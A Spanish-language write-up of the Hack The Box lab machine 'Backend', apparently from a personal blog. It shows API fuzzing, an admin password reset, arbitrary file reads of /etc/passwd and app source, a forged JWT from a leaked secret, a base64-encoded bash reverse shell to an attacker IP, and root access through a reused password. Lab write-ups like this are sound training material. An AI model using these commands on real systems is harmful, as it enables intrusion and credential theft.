---
layout: post
title: Backend
date: 2023-10-12
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Backend-htb/Backend.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.161 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 09:02 GMT
Nmap scan report for 10.10.11.161
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.161 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 09:03 GMT
Nmap scan report for 10.10.11.161
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Thu, 12 Oct 2023 13:14:20 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Thu, 12 Oct 2023 13:14:07 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Thu, 12 Oct 2023 13:14:14 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=10/12%Time=6527B658%P=x86_64-pc-linux-gnu%r(Get
SF:Request,AD,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Thu,\x2012\x20Oct\x20202
SF:3\x2013:14:07\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2029\r\n
SF:content-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg
SF:\":\"UHC\x20API\x20Version\x201\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x20
SF:405\x20Method\x20Not\x20Allowed\r\ndate:\x20Thu,\x2012\x20Oct\x202023\x
SF:2013:14:14\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncon
SF:tent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail
SF:\":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(
SF:FourOhFourRequest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Thu,
SF:\x2012\x20Oct\x202023\x2013:14:20\x20GMT\r\nserver:\x20uvicorn\r\nconte
SF:nt-length:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x2
SF:0close\r\n\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rec
SF:eived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequest
SF:TCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20
SF:request\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalS
SF:erverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20
SF:HTTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.35 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.161
http://10.10.11.161 [200 OK] Country[RESERVED][ZZ], HTTPServer[uvicorn], IP[10.10.11.161]
```

La página principal corresponde a una API

```null
curl -s -X GET 10.10.11.161 | jq
{
  "msg": "UHC API Version 1.0"
}
```

Aplico fuzzing para descubrir rutas

```null
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000076:   401        0 L      2 W        30 Ch       "docs"                                                                                                                                         
000001012:   200        0 L      1 W        20 Ch       "api"                                                                                                                                          
000045226:   200        0 L      4 W        29 Ch       "http://10.10.11.161/"                                                                                                                         

Total time: 392.8044
Processed Requests: 220546
Filtered Requests: 220543
Requests/sec.: 561.4651
```

Para leer ```/docs``` es necesario estar autenticado

```null
curl -s -X GET http://10.10.11.161/docs | jq
{
  "detail": "Not authenticated"
}
```

Si embargo, en ```/api``` la respuesta cambia

```null
curl -s -X GET http://10.10.11.161/api | jq
{
  "endpoints": [
    "v1"
  ]
}
```

Para el endpoint ```v1``` existen ```user``` y ```admin```

```null
curl -s -X GET http://10.10.11.161/api/v1 | jq
{
  "endpoints": [
    "user",
    "admin"
  ]
}
```

Le tramito una petición por GET a ```user``` pero me devuelve un código de estado 404

```null
curl -s -X GET http://10.10.11.161/api/v1/user | jq
{
  "detail": "Not Found"
}
```

Le introduzo un número suponiendo que se emplean como identificadores de usuario

```null
curl -s -X GET http://10.10.11.161/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```

Para aquellos que no existen, la respuesta cambia

```null
curl -s -X GET http://10.10.11.161/api/v1/user/2 | jq
null
```

Al tener una primera respuesta positiva, hago lo mismo con un bucle para encontrar otros posibles usuarios

```null
wfuzz -c -t 200 --hc=404,422 --hh=4 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/api/v1/user/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000034:   200        0 L      1 W        141 Ch      "01"                                                                                                                                           
000000031:   200        0 L      1 W        141 Ch      "1"                                                                                                                                            
000001789:   200        0 L      1 W        141 Ch      "001"                                                                                                                                          
000004222:   200        0 L      1 W        141 Ch      "0001"                                                                                                                                         
000013645:   200        0 L      1 W        141 Ch      "00000001"                                                                                                                                     
000016027:   200        0 L      1 W        141 Ch      "00001"
```

Como por ```GET``` no he encontrado nada, cambio el método a ```POST```

```null
wfuzz -c -t 200 -X POST --hc=405 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/api/v1/user/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000203:   422        0 L      2 W        81 Ch       "signup"                                                                                                                                       
000000039:   422        0 L      3 W        172 Ch      "login"  
```

Hay que proporcionar los parámetros ```username``` y ```password``` para poder loggearse

```null
curl -s -X POST http://10.10.11.161/api/v1/user/login | jq
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

Por el momento no dispongo de credenciales válidas

```null
url -s -X POST http://10.10.11.161/api/v1/user/login -d 'username=admin&password=admin' | jq
{
  "detail": "Incorrect username or password"
}
```

Pruebo a registrar un usuario

```null
curl -s -X POST http://10.10.11.161/api/v1/user/signup -d 'username=admin&password=admin' | jq
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "value is not a valid dict",
      "type": "type_error.dict"
    }
  ]
}
```

Da un error de tipo de datos, así que cambio el formato a ```JSON```

```null
curl -s -X POST http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' | jq
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

En el error se puede ver que el primer campo no es ```username``` si no ```email```

```null
curl -s -X POST http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"email":"admin@htb.local","password":"admin"}' | jq
{
  "detail": "The user with this username already exists in the system"
}
```

Este usuario ya existe, como era de esperar, por lo que introduzco otro correo

```null
curl -s -X POST http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"email":"rubbx@htb.local","password":"admin"}' | jq
{}
```

Tras loggearme obtengo un ```JWT```

```null
curl -s -X POST http://10.10.11.161/api/v1/user/login -d 'username=rubbx@htb.local&password=admin' | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODA5MzQyLCJpYXQiOjE2OTcxMTgxNDIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYzIzMGExY2MtYTFjNi00NmVlLWJjNDgtZGFiOWNhYTc5MTViIn0.nw-T_3qB7JqdgUz1sg2lKZYMpiH0zQLaqs2q--5SB1I",
  "token_type": "bearer"
}
```

Desde [jwt.io](https://jwt.io/) puedo ver como está formado

<img src="/writeups/assets/img/Backend-htb/1.png" alt="">

El campo ```is_superuser``` está setteado a ```false``` pero no puedo modificarlo al no disponer del secreto para firmarlo. Vuelvo a tramitar una petición por GET ```/docs```, pero esta vez autenticado

```null
curl -s -X GET http://10.10.11.161/docs -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODA5MzQyLCJpYXQiOjE2OTcxMTgxNDIsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYzIzMGExY2MtYTFjNi00NmVlLWJjNDgtZGFiOWNhYTc5MTViIn0.nw-T_3qB7JqdgUz1sg2lKZYMpiH0zQLaqs2q--5SB1I"

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>docs</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

Lo envio a ```BurpSuite``` para ver el HTML interpretado. Para ello necesito arrastrar la cabecera ```Authentication```

<img src="/writeups/assets/img/Backend-htb/2.png" alt="">

Puedo ver los ```docs```

<img src="/writeups/assets/img/Backend-htb/3.png" alt="">

Un ```endpoint``` permite ver la primera flag

<img src="/writeups/assets/img/Backend-htb/4.png" alt="">

# Escalada

Es posible modificar la contraseña de cualquier usuario proporcionando su ```guid```. Modifico la de ```admin```

<img src="/writeups/assets/img/Backend-htb/5.png" alt="">

Ahora puedo iniciar sesión y obtener un nuevo JWT

```null
curl -s -X POST http://10.10.11.161/api/v1/user/login -d 'username=admin@htb.local&password=pwned123' | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.mU5_m_ktg4qJz5dKSx43MW3tpodKHjbMivcBXJsrdq0",
  "token_type": "bearer"
}
```

Este usuario tiene un ```endpoint``` que permite ejecutar comandos

<img src="/writeups/assets/img/Backend-htb/6.png" alt="">

Pero no dispone del parámetro ```debug``` que es necesario. Sin embargo, existe otro que me permite traer archivos locales de la máquina

<img src="/writeups/assets/img/Backend-htb/7.png" alt="">

Obtengo el ```/etc/passwd``` como ```PoC```

```null
curl -s -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.mU5_m_ktg4qJz5dKSx43MW3tpodKHjbMivcBXJsrdq0" -H "Content-Type: application/json" -d '{"file":"/etc/passwd"}' | jq  -r '.["file"]' | grep sh$
root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb:/home/htb:/bin/bash
```

Listo las variables de entorno

```null
curl -s -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.mU5_m_ktg4qJz5dKSx43MW3tpodKHjbMivcBXJsrdq0" -H "Content-Type: application/json" -d '{"file":"/proc/self/environ"}' | jq  -r '.["file"]' | tr ':' '\n'
APP_MODULE=app.main
appPWD=/home/htb/uhcLOGNAME=htbPORT=80HOME=/home/htbLANG=C.UTF-8VIRTUAL_ENV=/home/htb/uhc/.venvINVOCATION_ID=83a8dc6217124f6eabe2a17ecd2338eeHOST=0.0.0.0USER=htbSHLVL=0PS1=(.venv) JOURNAL_STREAM=9
18447PATH=/home/htb/uhc/.venv/bin
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/binOLDPWD=/
```

Desde la ruta ```/home/htb/uhc/app/main.py``` puedo ver el código fuente

```null
curl -s -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.mU5_m_ktg4qJz5dKSx43MW3tpodKHjbMivcBXJsrdq0" -H "Content-Type: application/json" -d '{"file":"/home/htb/uhc/app/main.py"}' | jq  -r '.["file"]' | tr ':' '\n'
```

```py
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app import deps
from app import crud


app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)


@app.get("/", status_code=200)
def root()

    """
    Root GET
    """
    return {"msg"
 "UHC API Version 1.0"}


@app.get("/api", status_code=200)
def list_versions()

    """
    Versions
    """
    return {"endpoints"
["v1"]}


@app.get("/api/v1", status_code=200)
def list_endpoints_v1()

    """
    Version 1 Endpoints
    """
    return {"endpoints"
["user", "admin"]}


@app.get("/docs")
async def get_documentation(
    current_user
 User = Depends(deps.parse_token)
    )

    return get_swagger_ui_html(openapi_url="/openapi.json", title="docs")

@app.get("/openapi.json")
async def openapi(
    current_user
 User = Depends(deps.parse_token)
)

    return get_openapi(title = "FastAPI", version="0.1.0", routes=app.routes)

app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)

def start()

    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")

if __name__ == "__main__"

    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")
```

Se puede ver que se está importando la librería ```app.core.config```. En python correspondería a la ruta ```/home/htb/uhc/app/core/config.py```

```null
curl -s -X POST http://10.10.11.161/api/v1/admin/file -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.mU5_m_ktg4qJz5dKSx43MW3tpodKHjbMivcBXJsrdq0" -H "Content-Type: application/json" -d '{"file":"/home/htb/uhc/app/core/config.py"}' | jq  -r '.["file"]' | tr ':' '\n'
```

```py
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings)

    API_V1_STR
 str = "/api/v1"
    JWT_SECRET
 str = "SuperSecretSigningKey-HTB"
    ALGORITHM
 str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES
 int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g
 '["http
//localhost", "http
//localhost
4200", "http
//localhost
3000", \
    # "http
//localhost
8080", "http
//local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS
 List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v
 Union[str, List[str]]) -> Union[List[str], str]

        if isinstance(v, str) and not v.startswith("[")

            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str))

            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI
 Optional[str] = "sqlite
///uhc.db"
    FIRST_SUPERUSER
 EmailStr = "root@ippsec.rocks"    

    class Config

        case_sensitive = True
 

settings = Settings()
```

Contiene el secreto que me permite crear y modificar JWT. Añado el parámetro ```debug``` que faltaba

<img src="/writeups/assets/img/Backend-htb/8.png" alt="">

Puedo ejecutar comandos

```null
curl -s -X GET http://10.10.11.161/api/v1/admin/exec/whoami -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjp0cnVlLCJndWlkIjoiMzZjMmU5NGEtNDI3MS00MjU5LTkzYmYtYzk2YWQ1OTQ4Mjg0In0.D2KDtJaiztxRt_7Ud_LarXC4Bm5MX2hgOvtBlHa5pig" | jq
"htb"
```

Creo una cadena en base64 que se encargue de enviarme una reverse shell

```null
echo -n "bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'" | base64 -w 0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYxJw==
```

En el endpoint le hago el decode y ejecuto

```null
curl -s -X GET 'http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0MyAwPiYxJw==|base64%20-d%20|bash' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3ODEwODk4LCJpYXQiOjE2OTcxMTk2OTgsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjp0cnVlLCJndWlkIjoiMzZjMmU5NGEtNDI3MS00MjU5LTkzYmYtYzk2YWQ1OTQ4Mjg0In0.D2KDtJaiztxRt_7Ud_LarXC4Bm5MX2hgOvtBlHa5pig" | jq
```

Gano acceso al sistema

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.161] 35152
bash: cannot set terminal process group (670): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@backend:~/uhc$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb@backend:~/uhc$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
htb@backend:~/uhc$ export TERM=xterm-color
htb@backend:~/uhc$ export SHELL=bash
htb@backend:~/uhc$ stty rows 55 columns 209
htb@backend:~/uhc$ source ~/.bashrc 
```

En el archivo ```auth.log``` se lekea una contraseña

```null
tb@backend:~/uhc$ cat auth.log 
10/12/2023, 11:48:03 - Login Success for admin@htb.local
10/12/2023, 11:51:23 - Login Success for admin@htb.local
10/12/2023, 12:04:43 - Login Success for admin@htb.local
10/12/2023, 12:08:03 - Login Success for admin@htb.local
10/12/2023, 12:13:03 - Login Success for admin@htb.local
10/12/2023, 12:16:23 - Login Success for admin@htb.local
10/12/2023, 12:29:43 - Login Success for admin@htb.local
10/12/2023, 12:38:03 - Login Success for admin@htb.local
10/12/2023, 12:39:43 - Login Success for admin@htb.local
10/12/2023, 12:46:23 - Login Success for admin@htb.local
10/12/2023, 12:54:43 - Login Failure for Tr0ub4dor&3
10/12/2023, 12:56:18 - Login Success for admin@htb.local
10/12/2023, 12:56:23 - Login Success for admin@htb.local
10/12/2023, 12:56:43 - Login Success for admin@htb.local
10/12/2023, 12:58:03 - Login Success for admin@htb.local
10/12/2023, 13:03:03 - Login Success for admin@htb.local
10/12/2023, 13:09:43 - Login Success for admin@htb.local
10/12/2023, 13:35:37 - Login Failure for admin
10/12/2023, 13:41:53 - Login Failure for rubbx
10/12/2023, 13:42:21 - Login Success for rubbx@htb.local
10/12/2023, 13:56:15 - Login Success for rubbx@htb.local
10/12/2023, 14:08:17 - Login Success for admin@htb.local
```

Se reutiliza para el usuario ```root``` a nivel de sistema. Puedo ver la segunda flag

```null
htb@backend:~/uhc$ su root
Password: 
root@backend:/home/htb/uhc# cat /root/root.txt 
fd8d2d5069683846dab92a4c5522de48
```